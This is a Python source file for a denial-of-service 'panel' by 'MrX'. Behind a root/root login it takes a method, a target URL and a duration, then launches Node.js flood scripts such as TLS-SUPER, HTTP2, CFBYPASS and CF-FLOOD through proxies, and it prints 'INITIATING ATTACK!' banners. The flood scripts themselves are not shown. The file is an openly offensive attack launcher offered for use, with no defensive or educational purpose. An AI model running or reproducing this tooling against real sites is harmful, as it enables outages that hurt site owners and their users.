from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = "MrxD"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')



def l7():
	os.system("l7" if os.name == "nt" else "clear")
	print('''
   \033[94m Created by \033[91mMrX\033[0m | \033[93mCommand Center: \033[96mLayer7\033[0m | \033[92mVersion: \033[95m∞\033[0m
   ''')
	print("")
	print('''
              \033[96;1m%&\033[0m                            
            \033[96;1m&&&&\033[0m%   \033[95;1m# % %#%\033[0m      \033[95;1m@.\033[0m          
          \033[96;1m&&&&&\033[0m% \033[95;1m% \033[94;1m######.#\033[0m   \033[95;1m@@\033[0m           
         \033[95;1m#&&&&\033[0m%\033[96;1m(/ % \033[94;1m.######((\033[0m               
         \033[96;1m&&&\033[0m#%(\033[95;1m&&\033[0m%,/%%%###%%%  /\033[96;1m(#\033[0m           
         \033[96;1m&&&&&&&&\033[0m%  ,%,%%%%   ,&             
         \033[96;1m&&\033[0m#%&&&&&\033[96;1m,\033[0m & (* *% .                 
          \033[95;1m%&%\033[0m&&&&&%      \033[96;1m% #\033[0m                 
           \033[94;1m#&&&&&&\033[0m% \033[94;1m&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m%&&\033[0m           
             \033[95;1m%&&&\033[0m\033[94;1m%&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m&&\033[0m\033[94;1m&&\033[0m\033[96;1m%&&\033[0m           
                 \033[95;1m%&&&&&&&&&&\033[0m
                                                       
                   \033[96;1mTYPE:\033[0m [\033[94;1mMETHOD\033[0m] [\033[92;1mURL\033[0m] [\033[95;1mTIME\033[0m] 
                                                         
         ╔══════════════╗╔════════════╗╔════════════╗
        \033[94m ║ \033[37m99 SEC MAX \033[94m  ║║ \033[37m99 SEC MAX \033[94m║║ \033[37m99 SEC MAX \033[94m║
        \033[94m ║══════════════║║════════════║║════════════║
        \033[94m ║\033[37m•BOT\033[94m          ║║\033[37m•CF-FLOOD\033[94m   ║║\033[37m•CFBYPASS  \033[94m ║
        \033[94m ║\033[37m•NOX\033[94m          ║║\033[37m•SAKALAM\033[94m    ║║\033[37m•SKY \033[94m       ║
        \033[94m ║\033[37m•TLS-SUPER\033[94m    ║║\033[37m•TLS\033[94m        ║║\033[37m•TLSV4     \033[94m ║
        \033[94m ║\033[37m•YOLO\033[94m         ║║\033[37m•TCP\033[94m        ║║\033[37m•TLSPUNK  \033[94m  ║
        \033[94m ║\033[37m•HTTP-UAM\033[94m     ║║\033[37m•HTTP2\033[94m      ║║\033[37m•HTTPS   \033[94m   ║
        \033[94m ║                                          ║
        \033[94m ╚══════════════╝╚════════════╝╚════════════╝
        \033[39m               \x1b[255;255;0m  KANTOTIN MO! :V
        \033[94m         BAHALA KA KUNG ANO MASIRA MO
''')

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
    \033[94m Created by \033[91mMrX\033[0m | \033[93mCommand Center: \033[96mLayer7\033[0m | \033[92mVersion: \033[95m∞\033[0m
   
 
              %&(                            
            &&&&%   # % %#%      @.          
          %&&&&&% % %######.#   @@           
         #&&&&%(/ % #.######((               
         &&&#%(&&%,/%%%###%%%  /(#           
         &&&&&&&&%  ,%,%%%%   ,&             
         &&&#&&&&, & (* *% .                 
          %&%&&&&&%      % #                 
           #&&&&&&&%%&&&&&&&&%%&&&&&         
             %&&&%&&&&&&&&&&&&&&&%           
                 %&&&&&&&&&&&&%              
                                             
          ╭───────────────────────────────────────────╮
          │    \033[34;1mL7\033[0m   ► SHOW L7 METHODS                   │
          │    \033[34;1mL4\033[0m   ► SHOW L4 METHODS                   │
          ╰───────────────────────────────────────────╯
""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m

                                             
                   ╔═════════════════════════╗
                   ║        MrX | Shen       ║
                   ║   DEVELOPER| MrX        ║
                   ╚═════════════════════════╝
  


                      %#        (#%                   
                     %#,      /                      
                         . /(/**/%#                   
                       %.......    ...#               
                     ,..........     ...,             
                   *.....................%.           
                   (...............*%/////###****#(%  
                   /....,*#%#(/////////%#((**###%##%  
                (%##///////////#%%##/*/###(#%####(    
            %#/****###//###*,**(###(###%###((*        
            %#####(#(#(#(####%%%####%#%%/(            
             %%###############%#//////#%//&           
                          ./(#%%%%,         ,         
                          /,                          
                         *                            
                                             
         (((((((((((((((((((((((((((((((((((((((((((((
""")

	while True:
		sys.stdout.write("\x1b]2;[\] Mrx-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[94;1m╔═══\033[94;1m[root\033[92;1m@\033[94;1mMrX\033[94;1m]\n╚══\x1b[38;2;0;255;189m> \033[97m")
		sinput = sin.split(" ")[0]
		if sinput.lower() in ["clear", "cls"]:
			os.system("clear")
			main()
		if sinput.lower() in ["help", ".help", "Help", ".HELP"]:
			help()
		if sinput.lower() in ['l7']:
			l7()
#########LAYER-7########

		elif sinput == "TLS-SUPER":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-SUPER.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ TLS-SUPER ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")
			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "HTTP2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP2.js {url} {time} 64 10 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP2 ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "BOT":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BOT.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ BOT ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "YOLO":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node YOLO.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ YOLO ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "TLS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS.js {url} {time} 512 5')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ TLS ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "SKY":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node SKY.js {url} {time} 512 5 proxy.txt')
				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ SKY ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "SAKALAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node SAKALAM.js {url} {time} 1 64 proxy.txt')
				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ SAKALAM ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "TLSPUNK":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLSPUNK.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ TLSPUNK ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "CFBYPASS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CFBYPASS.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ CFBYPASS ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "CF-FLOOD":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CF-FLOODER.js GET {url} proxy.txt {time} 512 5')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ CF-FLOOD ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "NOX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node NOX.js {url} {time} 512 5 proxy.txt')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ NOX ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "TLSV4":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLSV4.js {url} {time} 512 5')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ TLSV4 ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')

		elif sinput == "HTTP-UAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTP-UAM.js {url} {time} 512 5')

				os.system("cls" if os.name == "nt" else "clear")
				print(f"""
\033[36m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[37m╔═╗╔═╗╔╗╔╔╦╗
\033[36m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[37m╚═╗║╣ ║║║ ║
\033[36m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[37m╚═╝╚═╝╝╚╝ ╩
\033[36m                            INITIATING ATTACK!
\033[36m                ╚╦════════════════════════════════════════════╦╝
\033[36m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[39m                  TARGET   : [ {url} ]
\033[39m                   TIME     : [ {time} ]
\033[39m                   METHOD   : [ HTTP-U ]
\033[39m                   VIP      : [ \033[32mTrue\033[37m ]
\033[39m                   USER     : [ root ]
\033[36m           ╚════════════════════════════════════════════════════════╝
""")

			except IndexError:
				print('Usage: http-raw <target> <time> <method> ')
				print('Example: http-raw http://example.com 300 <GET/POST/HEAD>')
										
def login():
	sys.stdout.write(f"\x1b]2;[\] ANON-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "root"
	passwd = "root"
	username = input("""\033[36m
	

                                             
                   ╔═════════════════════════╗
                   ║        MrX | Shen       ║
                   ║   DEVELOPER| MrX        ║
                   ╚═════════════════════════╝
  


                      %#        (#%                   
                     %#,      /                      
                         . /(/**/%#                   
                       %.......    ...#               
                     ,..........     ...,             
                   *.....................%.           
                   (...............*%/////###****#(%  
                   /....,*#%#(/////////%#((**###%##%  
                (%##///////////#%%##/*/###(#%####(    
            %#/****###//###*,**(###(###%###((*        
            %#####(#(#(#(####%%%####%#%%/(            
             %%###############%#//////#%//&           
                          ./(#%%%%,         ,         
                          /,                          
                         *                            
                                             
         (((((((((((((((((((((((((((((((((((((((((((((
						   
\033[36m[\033[32mUSERNAME\033[36m]:\033[0m """)
	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[36mSuccessfully Login to ur Account")
		time.sleep(1)
		main()

login()